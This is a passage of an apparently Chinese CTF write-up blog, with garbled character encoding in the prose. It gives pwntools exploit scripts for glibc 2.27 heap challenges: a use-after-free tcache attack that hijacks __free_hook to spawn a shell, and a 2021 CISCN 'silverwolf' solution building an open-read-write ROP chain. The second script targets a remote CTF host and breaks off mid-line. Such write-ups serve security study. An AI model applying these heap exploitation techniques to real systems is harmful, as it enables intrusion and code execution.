rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">sl(p64(stack+<span class="number">0x160</span>)+p64(<span class="number">0x4013F1</span>)+p64(stack+<span class="number">0x38</span>)+shell)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="heap">heap</h4><p>2.27çš„å †é¢˜</p><p>add,free,show,editå››ä¸ªåŠŸèƒ½ï¼Œåªèƒ½ç”³è¯·å°å †å—ï¼Œå¹¶ä¸”åºå·ä¸º0ï¼Œå­˜åœ¨uafï¼Œæ”»å‡»tcachebinçš„æŒ‡é’ˆåŒºï¼Œä¹‹åæŠŠæŒ‡é’ˆåŒºfreeåœ¨ç”³è¯·å°å †å—é€ æˆå †å—åˆ‡å‰²ï¼Œå¾—åˆ°libc_baseï¼Œä¹‹åæ”»å‡»free_hookï¼Œgetshell</p><p>ä¸­é—´æ¥å—heapåœ°å€çš„æ—¶å€™æœ‰é—®é¢˜ï¼Œshowå‡ºæ¥çš„æ˜¯å­—ç¬¦ä¸²ï¼Œéœ€è¦è½¬ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#from struct import pack</span></span><br><span class="line"><span class="comment">#import ctypes</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#from ae64 import AE64</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">i,size</span>):</span><br><span class="line">rl(<span class="string">&quot;Input your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line">rl(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">i,content</span>):</span><br><span class="line">rl(<span class="string">&quot;Input your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line">rl(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">s(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;Input your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;Input your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">rl(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">data=p.recvline()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">little_endian_bytes = data[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># è½¬æ¢ä¸ºåå…­è¿›åˆ¶è¡¨ç¤º</span></span><br><span class="line">heap_base = <span class="built_in">int</span>(little_endian_bytes.<span class="built_in">hex</span>()[<span class="number">2</span>:-<span class="number">2</span>],<span class="number">16</span>)-<span class="number">0x260</span></span><br><span class="line"></span><br><span class="line">li(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x30</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">0</span>,p8(<span class="number">7</span>)*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x10</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=get_addr64()-<span class="number">4111520</span></span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>,p8(<span class="number">3</span>)*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(system)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">li(<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="font-style-color-rgb-34-34-38-2021-ciscn-silverwolf-font"><font style="color:rgb(34, 34, 38);">2021 ciscn silverwolf</font></h3><p>è¿™é‡Œå¥‰ä¸Š2021å¹´å›½èµ›é¢˜ç›®</p><p>ä¸¤ä¸ªé¢˜ç›®åŸºæœ¬ä¸€æ ·ï¼Œä½†æ˜¯å›½èµ›é¢˜ç›®å¼€äº†æ²™ç›’ï¼Œè¦èµ°orwï¼Œçœ‹åˆ«çš„åšå®¢éƒ½æ˜¯æŠŠorwåˆ†å¼€å¡å…¥å †å—ï¼Œèµ°setcontextï¼Œæˆ‘ç›´æ¥èµ°çš„environï¼ŒåŠ«æŒç¨‹åºæµç¨‹ï¼Œæ„Ÿè§‰æ›´ç®€å•ï¼Œsetcontexté‚£ç§æ–¹æ³•åç»­æœ‰æ—¶é—´åœ¨å­¦ä¹ </p><p>2.27çš„å †é¢˜</p><p>add,free,show,editå››ä¸ªåŠŸèƒ½ï¼Œåªèƒ½ç”³è¯·å°å †å—ï¼Œå¹¶ä¸”åºå·ä¸º0ï¼Œå­˜åœ¨uafï¼Œæ”»å‡»tcachebinçš„æŒ‡é’ˆåŒºï¼Œä¹‹åæŠŠæŒ‡é’ˆåŒºfreeåœ¨ç”³è¯·å°å †å—é€ æˆå †å—åˆ‡å‰²ï¼Œå¾—åˆ°libc_baseï¼Œä¹‹åæ”»å‡»stdout_attackï¼Œæ³„éœ²stackåœ°å€ï¼ŒåŠ«æŒeditåçš„ç¨‹åºæµç¨‹ï¼Œæ„é€ readï¼Œè¯»å…¥orwçš„é“¾å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28835</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">i,size</span>):</span><br><span class="line">rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line">rl(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">i,content</span>):</span><br><span class="line">rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line">rl(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">s(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">rl(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x58</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">rl(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x18c0</span></span><br><span class="line">li(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x30</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x58</span>)</span><br><span class="line">edit(<span class="number">0</span>,p8(<span class="number">7</span>)*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x10</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=get_addr64()-<span class="number">4111520</span></span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">rdi = libc_base+libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)).__next__()</span><br><span class="line"><span class="comment">#rdi=libc_base+0x00000000000215bf</span></span><br><span class="line"><span class="comment">#rsi=libc_base+0x0000000000023eea</span></span><br><span class="line">rsi = libc_base+libc.search(asm(<span class="string">&quot;pop rsi\nret&quot;</span>)).__next__()</span><br><span class="line">rdx = libc_base+libc.search(asm(<span class="string">&quot;pop rdx\nret&quot;</span>)).__next__()</span><br><span class="line"><span class="comment">#rdx=libc_base+0x0000000000001b96</span></span><br><span class="line"><span class="comment">#rdx_r12 = libc_base+libc.search(asm(&quot;pop rdx\npop r12\nret&quot;)).__next__()</span></span><br><span class="line">rax = libc_base+libc.search(asm(<span class="string">&quot;pop rax\nret&quot;</span>)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(<span class="string">&quot;ret&quot;</span>)).__next__()</span><br><span class="line"><span class="comment">#rax=libc_base+0x0000000000043ae8</span></span><br><span class="line"><span class="comment">#ret=libc_base+0x00000000000008aa</span></span><br><span class="line">syscall=libc_base+libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)).__next__()</span><br><span class="line">jmp_rsp=libc_base+libc.search(asm(<span class="string">&quot;jmp rsp&quot;</span>)).__next__()</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">syscall=libc_base+libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)).__next__()</span><br><span class="line">open_addr=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr=libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">IO_stdout=libc_base+libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">environ=libc_base+libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>,p8(<span class="number">3</span>)*<span class="number">7</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(IO_stdout)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">add(<span 